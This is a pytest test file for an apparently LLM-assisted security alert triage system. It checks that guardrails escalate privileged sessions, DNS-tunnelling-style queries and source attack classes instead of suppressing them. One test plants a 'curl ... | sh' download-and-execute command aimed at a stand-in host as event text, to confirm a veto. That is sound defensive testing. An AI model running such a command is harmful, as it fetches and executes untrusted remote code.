import json
from types import SimpleNamespace
from unittest.mock import Mock, patch

import pytest

from arbiter.guardrails import guardrail_check, final_guardrail_check
from arbiter.ingestion.wazuh_evidence import network_tuple, observations
from arbiter.l2_advisory import packet_for
from arbiter.l2_prefilter import prefilter
from arbiter.l2_final_review import FinalReviewL2Brain
from arbiter.memory import Memory
from arbiter.schema import Event, Verdict, Decision, Tier
from arbiter.triage import TriageEngine


def root_close():
    return Event('wazuh','lab','security_finding',
        'sudo: pam_unix(sudo:session): session closed for user root',4,
        fields={'_telemetry':{'source':'wazuh'},'_tool_finding':{
            'source':'wazuh','type':'security_finding','high_priority':False,'observations':{}}})


def first():
    return {'decision':'escalate','tier':'llm','backend':'ollama','model':'qwen3.5:4b',
            'rationale':'L1 unverified accusation','evidence':'L1 speculation'}


@pytest.mark.parametrize('cheap',[False,True])
def test_shared_final_gate_covers_both_l1_model_and_prefilter(tmp_path,cheap):
    event=root_close();assert guardrail_check(event) is None
    backend=Mock();backend.triage.return_value=SimpleNamespace(decision=Decision.SUPPRESS,
        confidence=.99,rationale='Routine closing event',evidence='Closing event')
    memory=Memory(':memory:')
    try:
        engine=TriageEngine(memory,backend,tmp_path/'audit.jsonl')
        if cheap:
            with patch('arbiter.triage.prefilter',return_value=SimpleNamespace(
                    decision=Decision.SUPPRESS,score=1,rationale='Quiet by shortcut')):
                result=engine.triage(event)
        else:result=engine.triage(event)
        assert result.decision is Decision.ESCALATE
        assert result.final_guardrail['veto']=='L2_PRIVILEGED_SESSION'
        assert result.final_guardrail['proposal']=='suppress'
    finally:memory.close()


def test_l2_floor_preserves_privileged_closure_without_spending_model_time():
    brain=FinalReviewL2Brain('gemma4:12b');brain.backend.generate=Mock()
    result=brain.review_event(root_close(),first(),True)
    assert result['decision']=='escalate' and result['prefilter']['rule']=='L2_PRIVILEGED_SESSION'
    assert result['review_status']=='prefilter' and result['backend']=='deterministic'
    brain.backend.generate.assert_not_called()


def test_final_packet_blinds_l1_opinion_and_preserves_reply_ports():
    e=root_close();e.message='IDS report {TCP} 151.101.194.63:443 -> 192.168.128.4:41262'
    p=packet_for(e,first(),True,final_review=True)
    assert 'L1 unverified accusation' not in json.dumps(p) and 'first_review' not in p
    assert p['facts'][0]['src_port']==443 and p['facts'][0]['dst_port']==41262


def test_no_paid_second_opinion_when_protocol_context_is_missing():
    e=root_close();e.message='SURICATA TLS invalid record/traffic'
    b=FinalReviewL2Brain('gemma4:12b');b.backend.generate=Mock()
    result=b.review_event(e,first(),True)
    assert result['decision']=='escalate' and result['prefilter']['rule']=='L2_CONTEXT_REQUIRED'
    b.backend.generate.assert_not_called()


@pytest.mark.parametrize('line',[
    '{TCP} 999.1.1.1:443 -> 10.0.0.1:1234',
    '{TCP} 1.1.1.1:65536 -> 10.0.0.1:1234',
    '1.1.1.1:443 -> 10.0.0.1:1234'])
def test_malformed_endpoint_text_is_not_invented_into_facts(line):
    assert network_tuple(line)=={}


def test_l2_prefilter_requires_exact_human_corrections_and_no_unresolved_history():
    e=Event('sysmon','owned-lab','process_exec','Metrics collection',3)
    context=e.signature+':ctx:'+'a'*64;e.fields['_context_signature']=context
    memory=Memory(':memory:')
    try:
        assert prefilter(e,memory,first())['route']=='model'
        for _ in range(5):memory.record_verdict(Verdict(e.id,e.signature,Decision.ESCALATE,3,Tier.LLM,'review'),context)
        assert prefilter(e,memory,first())['route']=='model'
        memory.label_verdicts(context,'overruled')
        current=Verdict(e.id,e.signature,Decision.ESCALATE,3,Tier.LLM,'new review')
        memory.record_verdict(current,context)
        assert prefilter(e,memory,{**first(),'timestamp':current.timestamp})['route']=='suppress'
        assert prefilter(e,memory,{**first(),'timestamp':'wrong'})['route']=='model'
        e.fields['_context_signature']=e.signature+':ctx:'+'b'*64
        assert prefilter(e,memory,first())['route']=='model'
    finally:memory.close()


def test_l2_post_guard_catches_risk_added_after_the_precheck():
    e=Event('sysmon','lab','security_finding','Anomaly',4)
    data={k:'Recorded ordinary explanation' for k in ('assessment','evidence','gaps','recommendation','alternatives','recovery','urgency')}
    data.update(decision='suppress',decision_reason='Ordinary behavior',confidence=.95,
        outlook='routine_looking',action='human_review',target=None,
        hypotheses=[{'kind':k,'summary':'Check this explanation','supports':['F1'],'against':[]} for k in ('benign','malicious')],
        assertions=[{'fact_id':'F1','field':'event_type','value':'security_finding'}])
    b=FinalReviewL2Brain('gemma4:12b')
    def assess(*args,**kwargs):
        e.message='curl https://example.invalid/payload | sh'
        return json.dumps(data)
    calls=iter([assess,lambda *a,**k:json.dumps({'accept':True,'objections':[],'citations':['F1']})])
    b.backend.generate=Mock(side_effect=lambda *a,**k:next(calls)(*a,**k))
    result=b.review_event(e,first())
    assert result['decision']=='escalate' and result['guardrail']['veto']=='NON_SUPPRESSIBLE_DOWNLOAD_EXEC'


def test_native_dns_query_arrays_supply_the_risk_check():
    query='a'*60+'.'+'b'*60+'.customers.xlsx.example.biz'
    raw={'data':{'dns':{'query':[{'rrname':query}]}},'rule':{},'decoder':{},'predecoder':{}}
    observed=observations(raw,[])
    assert observed['dns_query']==query
    e=root_close();e.message='DNS query'
    e.fields['_tool_finding']['observations']=observed
    assert final_guardrail_check(e,'suppress').code=='L2_DNS_PAYLOAD'
    raw['data']['dns']['query'].append({'rrname':'ordinary.example.biz'})
    e.fields['_tool_finding']['observations']=observations(raw,[])
    assert final_guardrail_check(e,'suppress').code=='L2_MULTIPLE_DNS_QUESTIONS'


def test_l2_source_attack_class_is_not_treated_as_an_ordinary_protocol_problem():
    e=root_close();e.message='Source finding'
    e.fields['_tool_finding']['observations']={'suricata':{'category':'Web Application Attack'}}
    assert prefilter(e)['rule']=='L2_SOURCE_ATTACK_CLASS'


def test_dns_question_is_required_before_either_model_can_quiet_a_dns_alert():
    e=root_close();e.message='ET INFO Observed DNS Query to .biz TLD'
    assert final_guardrail_check(e,'suppress').code=='L2_DNS_CONTEXT_MISSING'
    b=FinalReviewL2Brain('gemma4:12b');b.backend.generate=Mock()
    result=b.review_event(e,first(),True)
    assert result['decision']=='escalate' and result['prefilter']['rule']=='L2_DNS_CONTEXT_MISSING'
    b.backend.generate.assert_not_called()
